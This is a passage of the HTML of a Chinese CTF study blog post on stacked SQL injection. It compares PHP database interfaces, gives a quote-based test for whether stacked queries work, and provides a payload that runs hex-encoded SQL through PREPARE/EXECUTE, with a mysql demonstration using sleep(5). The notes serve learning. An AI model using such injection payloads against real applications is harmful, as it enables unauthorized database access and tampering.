class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="堆叠"><a href="#堆叠" class="headerlink" title="堆叠"></a>堆叠</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3950">https://xz.aliyun.com/t/3950</a></p>
+<p>PHP连接MySQL数据库有三种方式（MySQL、Mysqli、PDO）</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th><strong>Mysqli</strong></th>
+<th><strong>PDO</strong></th>
+<th><strong>MySQL</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>服务端prepare语句的支持情况</td>
+<td>==是==</td>
+<td>==是==</td>
+<td>否</td>
+</tr>
+<tr>
+<td>客户端prepare语句的支持情况</td>
+<td>否</td>
+<td>是</td>
+<td>否</td>
+</tr>
+<tr>
+<td>多语句执行支持情况</td>
+<td>是</td>
+<td>==大多数==</td>
+<td>否</td>
+</tr>
+</tbody></table>
+<p>只有sqli和pdo有堆叠注入（包括预处理）</p>
+<p>前者通过<code>mysqli_query()</code>函数来进行多语句执行，后者通过<code>query()</code>函数</p>
+<p><strong>存在堆叠注入的判断方法</strong> : <strong>名称处加单引号报错，加双引号不报错，加单引号和分号不报错，说明存在堆叠注入。</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;   报错</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>;  恢复正常</span><br><span class="line"></span><br><span class="line">&quot;   正常</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asd<span class="string">&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>理解</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> hex(<span class="string">&#x27;select sleep(5)&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> hex(<span class="string">&#x27;select sleep(5)&#x27;</span>)         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">73656</span>C65637420736C656570283529 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656C65637420736C656570283529</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="variable">@a</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">execute</span> test;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> sleep(<span class="number">5</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">5.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/13/PNG%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>PNG文件结构</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/12/SQL%E7%BB%95%E8%BF%87/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      SQL注入绕过姿势
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
+                    <a class="foot-link" href="">735587142</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+  
+  
+    <script type="text/javascript" src=/js/toc.js></script>
+  
+
+  </body>
+</html>
